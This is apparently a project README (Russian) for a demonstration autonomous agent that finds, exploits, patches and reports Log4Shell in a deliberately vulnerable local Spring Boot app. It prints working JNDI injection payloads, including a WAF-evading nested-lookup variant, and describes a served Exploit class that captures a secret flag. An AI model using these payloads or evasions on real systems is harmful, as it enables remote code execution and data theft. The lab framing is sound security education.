# 🤖 AUTO AUDIT: Autonomous Reactive Pentest Agent

*Read this in other languages: [English](README.en.md), [Русский](README.md).*

> **Изолированный демонстрационный стенд автономного рефлексивного агента-исполнителя (Go/Java)**

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)](https://golang.org)
[![Java Version](https://img.shields.io/badge/Java-17+-ED8B00?style=for-the-badge&logo=openjdk)](https://openjdk.org)
[![Maven](https://img.shields.io/badge/Maven-3.8+-C71A36?style=for-the-badge&logo=apachemaven)](https://maven.apache.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

---

## 🧭 Общие сведения

**AUTO AUDIT** — это программный комплекс, демонстрирующий **100% автономный замкнутый цикл (Sense-Think-Act)** выявления, проверки, эксплуатации, автоматического исправления (*Self-Healing / Auto-Remediation*) и комплаенс-отчетности для критической уязвимости **Log4Shell (CVE-2021-44228 / БДУ ФСТЭК:2021-06103)**.

Стенд развертывает локальное веб-приложение на базе **Java Spring Boot**, встроенный **LDAP TCP Callback Listener** и когнитивное ядро **Go-агента**, принимающего решения в условиях частичной наблюдаемости внешней среды (*Partially Observable Markov Decision Process — POMDP*).

```mermaid
graph TD
    subgraph "СЕНСОРНЫЙ АНАЛИЗ (Sense)"
        A[Внешние отклики / TCP-коллбеки] --> B(Обновление Базы Знаний)
    end
    subgraph "КОГНИТИВНОЕ ЯДРО (Think)"
        B --> C{Вычисление Utility Policy}
        C -->|Рефлексивный вывод| D[Выбор эффектора из реестра]
    end
    subgraph "ИСПОЛНЕНИЕ (Act)"
        D --> E[Выполнение Tool.Execute]
        E -->|Воздействие| F((Java Spring Boot Target))
        F -.->|Обратный канал OOB| A
    end
    
    style B fill:#111,stroke:#00ADD8,stroke-width:2px;
    style C fill:#111,stroke:#ED8B00,stroke-width:2px;
    style F fill:#222,stroke:#C71A36,stroke-width:3px;
```

---

## 🛠️ Техническая архитектура и компоненты

Программная структура агента разработана в соответствии с принципами чистой архитектуры (*Hexagonal Architecture / Ports and Adapters*), SOLID и TDD:

* **[cmd/agent/main.go](cmd/agent/main.go)** — Точка входа. Управляет жизненным циклом фоновых процессов и координирует запуск горутины агента.
* **[internal/agent/agent.go](internal/agent/agent.go)** — Когнитивный контур. Реализует управляющий цикл и решающее правило выбора стратегии `Think()`.
* **[internal/core/model.go](internal/core/model.go)** — Потокобезопасная база знаний (`KnowledgeBase` / LTM) на базе `sync.RWMutex`.
* **[internal/core/effector.go](internal/core/effector.go)** — Интерфейс `Tool` для эффекторов.
* **[internal/effectors/](internal/effectors/)** — Реестр полиморфных эффекторов (инструментов):
  * `ToolPortScanner` — Разведка сетевого периметра.
  * `ToolDiscovery` — Поиск точек сочленения и векторов ввода (`X-Api-Version`).
  * `ToolPayloadGenerator` — Синтез сигнатурного вектора JNDI.
  * `ToolProber` — Проверка уязвимости методом внеполосной (Out-of-Band) трассировки.
  * `ToolSemanticFuzzer` — Обход классификаторов фильтрации (WAF Evasion) с помощью вложенных синтаксических мутаций.
  * `ToolRemediator` — Автоматический патчинг.
  * `ToolReporter` — Формирование отчета в соответствии с ГОСТ Р 56939-2016.
* **[pkg/oob/](pkg/oob/)** — Out-of-band слушатели (LDAP и HTTP).
* **[pkg/jvm/](pkg/jvm/)** — Управление жизненным циклом и перезапуском локальной Java-цели.
* **[deployments/](deployments/)** — Конфигурационные файлы для развертывания (Docker, Compose).
* **[test/vulnerable-app/](test/vulnerable-app/)** — Уязвимое тестовое Java Spring Boot приложение.

---

## 🎯 Математический аппарат и спецификация когнитивного цикла (Think-Act Loop)

Принятие решений агентом формализовано как **частично наблюдаемый марковский процесс принятия решений (POMDP)**, описываемый кортежем $\langle S, A, T, R, \Omega, O, \gamma \rangle$:
* $S$ — дискретное пространство скрытых состояний целевой среды (доступность порта, наличие уязвимых параметров, активность WAF, факт компрометации, статус патчинга, наличие комплаенс-отчета).
* $A$ — пространство действий эффекторов (вызов инструментов: `port_scanner`, `discovery`, `payload_generator`, `prober`, `semantic_fuzzer`, `remediator`, `reporter`, `stop`).
* $\Omega$ — пространство наблюдений (полученные HTTP-ответы, OOB TCP-коллбеки, записи файловой системы).
* $O(o \mid s', a)$ — функция наблюдений, определяющая вероятность получения отклика $o \in \Omega$.

### 1. Вектор доверия (Belief State)
Агент не имеет прямой информации о скрытом состоянии среды $s \in S$ и оперирует вектором доверия $b(s)$ — вероятностным распределением на $S$, которое хранится и динамически обновляется в памяти `KnowledgeBase`:
* $b(S_{recon}) \in \{0, 1\}$ — состояние сетевой разведки (порт открыт/закрыт). Отображается на `ToolPerformance["port_scanner"]`.
* $b(S_{discovery}) \in \{0, 1\}$ — маппинг векторов ввода (найдены ли параметры). Отображается на `len(DiscoveryVectors) > 0`.
* $b(S_{payload}) \in \{0, 1\}$ — готовность эксплоит-сигнатуры. Отображается на `len(CustomPayloads) > 0`.
* $b(S_{exploit}) \in \{0, 1\}$ — статус компрометации (наличие Loot/Flag). Отображается на `len(Loot) > 0`.
* $b(S_{patch}) \in \{0, 1\}$ — факт локализации уязвимости. Отображается на `PatchApplied`.
* $b(S_{verify}) \in \{0, 1\}$ — верификация отсутствия повторного OOB-триггера. Отображается на `PatchVerified`.
* $b(S_{report}) \in \{0, 1\}$ — генерация регламентированного отчета. Отображается на `ReportGenerated`.

### 2. Функция решающего правила (Policy Mapping)
Функция принятия решений `Think()` реализует детерминированное решающее правило $\pi: B \to A$, последовательно отображающее текущее накопленное состояние доверия $b$ на оптимальное действие эффектора $a \in A$.

### 3. Адаптивное обучение и оценка эффективности инструментов
Для каждого инструмента $a \in A$ в памяти `ToolStats` накапливается статистика и вычисляется показатель полезности (Efficiency Score):

$$\text{EfficiencyScore}(a) = \frac{SuccessCount_a}{UsageCount_a}$$

Агент использует эти показатели для динамического изменения траектории: если первичный зонд `prober` завершился неудачей ($\text{EfficiencyScore}(\text{prober}) = 0$), агент идентифицирует наличие фильтрации на целевом узле (WAF), активирует компенсационную стратегию обхода WAF с помощью инструмента `semantic_fuzzer` и выполняет мутацию вектора внедрения.

### Пошаговый сценарий работы стенда:

| Шаг | Выбранный Инструмент | Действие и физика процесса | Изменение Belief State |
| :--- | :--- | :--- | :--- |
| **1** | `port_scanner` | Проверка TCP-сокета хоста `:8080`. | Обнаружен открытый HTTP-порт веб-службы ($b(S_{recon}) = 1$). |
| **2** | `discovery` | Выполнение GET-запроса, парсинг DOM и заголовков. | Идентифицирован вектор ввода: заголовок `X-Api-Version` ($b(S_{discovery}) = 1$). |
| **3** | `payload_generator` | Синтез базового эксплоит-вектора. | База данных пополняется строкой `\${jndi:ldap://127.0.0.1:1389/Exploit\}` ($b(S_{payload}) = 1$). |
| **4** | `prober` | Первичная атака. Агент отправляет полезную нагрузку. | Попытка заблокирована WAF. $\text{EfficiencyScore}(\text{prober}) = 0$. |
| **5** | `semantic_fuzzer` | Обфускация сигнатуры через nested lookups. | Сгенерирована мутировавшая сигнатура ($b(S_{payload}) = 1$, WAF bypass). |
| **6** | `prober` | Атака с обфусцированным вектором. | Встроенный LDAP-слушатель фиксирует входящее TCP-соединение. Выявлен факт RCE ($b(S_{exploit}) = 1$). |
| **7** | `remediator` | Автоматическое исправление. Запись флага в `remediation.properties` и перезапуск JVM. | Процесс Spring Boot перезапущен с флагом `-Dlog4j2.formatMsgNoLookups=true` ($b(S_{patch}) = 1$). |
| **8** | `prober` | Верификация (повторный зондирующий запрос). | Ожидание OOB-соединения на порту `1389`. Соединение отсутствует $\rightarrow$ $b(S_{verify}) = 1$. |
| **9** | `reporter` | Генерация markdown-отчета. | Документ `reports/cve_2021_44228_report.md` сформирован ($b(S_{report}) = 1$). |
| **10**| `stop` | Терминация. | Завершение работы. |

## 📊 Блок-схемы алгоритмов

### 1. Общий алгоритм работы агента (Sense-Think-Act Loop)
Данная схема описывает непрерывный жизненный цикл функционирования агента: от запуска и инициализации базы знаний до завершения сессии аудита.

```mermaid
flowchart TD
    Start([Начало]) --> Init[Инициализация StandaloneExecutor и KnowledgeBase]
    Init --> LoopStart{Цикл принятия решений}
    
    %% Think Phase
    LoopStart --> Think[Think: Выбор оптимального инструмента a = Think()]
    
    %% Branch on Stop
    Think --> IsStop{a == 'stop'?}
    IsStop -- Да --> Terminate([Завершение работы агента])
    
    %% Act Phase
    IsStop -- Нет --> FetchTool[Загрузка эффектора из реестра Tools[a]]
    FetchTool --> Execute[Act: Выполнение Tool.Execute]
    
    %% Sense Phase
    Execute --> Sense[Sense: Получение обратной связи из внешней среды]
    Sense --> UpdateStats[Обновление статистики ToolStats в памяти]
    UpdateStats --> RecordObs[Запись наблюдения в Observations]
    
    %% Wait
    RecordObs --> Delay[Задержка 800 мс]
    Delay --> LoopStart
```

### 2. Алгоритм когнитивного ядра принятия решений (Think)
Данная схема детально описывает логику выбора следующего шага на основе текущего накопленного вектора доверия (Belief State) внутри функции `Think()`:

```mermaid
flowchart TD
    Start([Вызов Think()]) --> Lock[Блокировка памяти RLock()]
    Lock --> ReadState[Чтение вектора доверия b]
    
    %% Step 1
    ReadState --> PortScan{port_scanner выполнен?}
    PortScan -- Нет --> RetPortScan[Выбрать 'port_scanner']
    
    %% Step 2
    PortScan -- Да --> Discovery{Найдено векторов ввода?}
    Discovery -- Нет --> RetDiscovery[Выбрать 'discovery']
    
    %% Step 3
    Discovery -- Да --> Payload{Сгенерирована эксплоит-сигнатура?}
    Payload -- Нет --> RetPayload[Выбрать 'payload_generator']
    
    %% Step 4 (Exploit)
    Payload -- Да --> Loot{Флаг RCE перехвачен?}
    Loot -- Нет --> ProberStats{Была попытка prober?}
    
    ProberStats -- Нет --> RetProber[Выбрать 'prober']
    ProberStats -- Да --> FuzzerStats{Fuzzer выполнен?}
    FuzzerStats -- Нет --> RetFuzzer[Выбрать 'semantic_fuzzer']
    FuzzerStats -- Да --> RetProber
    
    %% Step 5
    Loot -- Да --> Patch{Патч применен?}
    Patch -- Нет --> RetRemediator[Выбрать 'remediator']
    
    %% Step 6
    Patch -- Да --> Verify{Патч верифицирован?}
    Verify -- Нет --> RetProberVerify[Выбрать 'prober' в режиме верификации]
    
    %% Step 7
    Verify -- Да --> Report{Отчет сформирован?}
    Report -- Нет --> RetReporter[Выбрать 'reporter']
    
    %% Step 8
    Report -- Да --> RetStop[Выбрать 'stop']
    
    %% Return Statements
    RetPortScan --> Unlock[Разблокировка RUnlock()]
    RetDiscovery --> Unlock
    RetPayload --> Unlock
    RetProber --> Unlock
    RetFuzzer --> Unlock
    RetRemediator --> Unlock
    RetProberVerify --> Unlock
    RetReporter --> Unlock
    RetStop --> Unlock
    
    Unlock --> End([Возврат выбранного инструмента])
```

---

## 📦 Спецификация уязвимого Java-приложения

Приложение-цель в директории `test/vulnerable-app/` представляет собой минимальный REST-сервис на базе **Spring Boot 2.7.18** с намеренно заниженными версиями библиотек **Apache Log4j2**:

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version> <!-- Уязвимая версия, поддерживающая lookup JNDI -->
</dependency>
```

Уязвимый контроллер логирует входящие HTTP-заголовки без предварительной очистки:
```java
logger.info("[AUDIT] API Version header logged: {}", apiVersion);
```

При получении строки вида `\${jndi:ldap://...\}` логгер инициирует резолв JNDI-адреса, отправляя запрос по протоколу LDAP на порт `1389`.

---

## 🚀 Инструкция по запуску

Демонстрационный стенд поддерживает два режима развертывания: локальный запуск непосредственно на хост-системе (Вариант А) или полностью контейнеризированный запуск в изолированном сетевом окружении через Docker Compose (Вариант Б).

### Вариант А. Локальный запуск на хост-системе

#### Предварительные требования
* **JDK 17+** (проверьте через `java -version`)
* **Maven 3.8+** (проверьте через `mvn -version`)
* **Go 1.21+** (проверьте через `go version`)

#### 1. Сборка Java-микросервиса
Скомпилируйте Java-цель в толстый JAR-артефакт:
```bash
cd test/vulnerable-app
mvn clean package
cd ../..
```
*Убедитесь, что в директории `test/vulnerable-app/target/` успешно создался файл `vulnerable-app-simple-1.0.0.jar`.*

#### 2. Сборка Exploit payload
Скомпилируйте Java Exploit класс, который будет раздаваться HTTP-сервером:
```bash
javac internal/payload/Exploit.java
```

#### 3. Компиляция и запуск демонстрационного стенда
Запуск в режиме интерпретации Go на лету:
```bash
go run ./cmd/agent
```

Или выполните компиляцию в исполняемый бинарный файл:
```bash
go build -o test_agent ./cmd/agent
./test_agent
```

---

### Вариант Б. Запуск в изолированном Docker-окружении (Docker Compose)

Этот вариант не требует установки Go, Java или Maven на вашей хост-системе. Всё окружение собирается и оркеструется автоматически в изолированной виртуальной сети `172.20.0.0/16`.

#### Предварительные требования
* Установленный **Docker** и плагин **Docker Compose** (проверьте через `docker compose version`).

#### 1. Запуск стенда
Выполните сборку образов и запуск контейнеров одной командой из корневой директории проекта:
```bash
docker compose -f deployments/docker-compose.yml up --build
```

#### 2. Описание процессов в контейнерах:
* `vulnerable-app` автоматически скомпилирует Java-приложение Spring Boot, запишет секретный флаг в закрытую директорию `/var/lib/secret/flag.txt` и запустит веб-сервер на порту `:8080`.
* `reflective-agent` скомпилирует Go-код агента, скомпилирует Java-payload `Exploit.java`, поднимет OOB-серверы и запустит когнитивный цикл.
* Локальная папка `reports/` на хост-системе примонтирована к контейнеру агента — сгенерированный в конце работы ГОСТ-отчет автоматически сохранится в вашей директории `reports/cve_2021_44228_report.md`.

#### 3. Остановка стенда
Для завершения симуляции и удаления сетевых ресурсов выполните:
```bash
docker compose -f deployments/docker-compose.yml down
```

---

## 📊 Пример консольного вывода

```text
=== ДЕМОНСТРАЦИОННЫЙ СТЕНД РЕАКТИВНОГО АГЕНТА (JAVA SPRING TARGET) ===
[*] Запуск скомпилированного уязвимого Java Spring приложения локально...
[*] Ожидание инициализации веб-контекста Spring (3.5 сек)...
[*] Инициализация агента-исполнителя для цели: http://localhost:8080
================================================================
[ВЫВОД] Выбран инструмент: 'port_scanner' (Текущая фаза: Reconnaissance)
[ЭФФЕКТОР:port_scanner] Сканирование порта localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружен открытый HTTP-порт localhost:8080. Java Spring Web-служба отвечает.

[ВЫВОД] Выбран инструмент: 'discovery' (Текущая фаза: Discovery)
[ЭФФЕКТОР:discovery] Исследование структуры веб-приложения http://localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружены потенциальные векторы ввода: GET-параметр '/?input=' и HTTP-заголовок 'X-Api-Version'.

[ВЫВОД] Выбран инструмент: 'payload_generator' (Текущая фаза: Discovery)
[ЭФФЕКТОР:payload_generator] Анализ уязвимостей и синтез сигнатур...
[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирована сигнатурная нагрузка для CVE-2021-44228: '${jndi:ldap://127.0.0.1:1389/Exploit}'.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Discovery)
[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${jndi:ldap://127.0.0.1:1389/Exploit}' на http://localhost:8080...
[НАБЛЮДЕНИЕ] FAILURE: Атака не удалась. Уязвимость не эксплуатирована или флаг не перехвачен.

[ВЫВОД] Выбран инструмент: 'semantic_fuzzer' (Текущая фаза: Discovery)
[ЭФФЕКТОР:semantic_fuzzer] Запуск обфускации и семантического фаззинга против WAF...
[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирован обфусцированный вектор обхода: '${${lower:j}ndi:ldap://127.0.0.1:1389/bypass}'.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Discovery)
[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${${lower:j}ndi:ldap://127.0.0.1:1389/bypass}' на http://localhost:8080...
[LDAP SERVER] Получен LDAP BindRequest. Отправка BindResponse...
[LDAP SERVER] Получен LDAP SearchRequest. Отправка JNDI Referral...
[HTTP SERVER] Получен запрос на загрузку Exploit.class
[HTTP SERVER] >>> ПЕРЕХВАЧЕН СЕКРЕТНЫЙ ФЛАГ: FLAG{LOCAL_HOST_LOG4SHELL_SECRET_2026} <<<
[НАБЛЮДЕНИЕ] SUCCESS: LDAP Callback получен на порту 1389. RCE отработал. Перехваченный флаг: FLAG{LOCAL_HOST_LOG4SHELL_SECRET_2026}.

[ВЫВОД] Выбран инструмент: 'remediator' (Текущая фаза: Remediation)
[ЭФФЕКТОР:remediator] Анализ причин уязвимости и генерация исправления для http://localhost:8080...
[ЭФФЕКТОР:remediator] Отправка команды применения патча на http://localhost:8080/remediate...
[НАБЛЮДЕНИЕ] REMEDIATION_SUCCESS: Патч применен. На целевое приложение отправлен запрос ремедиации (изменен флаг -Dlog4j2.formatMsgNoLookups=true). JVM успешно переинициализирована.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Verification)
[ЭФФЕКТОР:prober] Верификация патча: Повторная атака уязвимости на http://localhost:8080...
[НАБЛЮДЕНИЕ] VERIFICATION_SUCCESS: Попытка эксплуатации отклонена сервером. Входящий TCP-коллбек на порт 1389 отсутствует. Уязвимость успешно устранена.

[ВЫВОД] Выбран инструмент: 'reporter' (Текущая фаза: Verification)
[ЭФФЕКТОР:reporter] Формирование отчета об уязвимости по стандартам РФ для http://localhost:8080...
[НАБЛЮДЕНИЕ] REPORT_SUCCESS: Отчет успешно сгенерирован и сохранен в файл 'reports/cve_2021_44228_report.md'.

================================================================
[INFO] Жизненный цикл аудита, патчинга и комплаенса завершен.
```

---

## 📜 Защита информации и комплаенс
Генерируемый агентом отчет в файле `reports/cve_2021_44228_report.md` учитывает ключевые российские стандарты ИБ:
* **ГОСТ Р 56939-2016** — Разработка безопасного программного обеспечения.
* **ФЗ-152** — Требования по защите персональных данных (ПДн) при обнаружении недекларированных возможностей.
* **ФЗ-187** — Обеспечение устойчивости объектов критической информационной инфраструктуры (КИИ РФ).

---

## 🛡️ Лицензия
Этот проект распространяется под лицензией **MIT**. Подробности в файле [LICENSE](LICENSE).
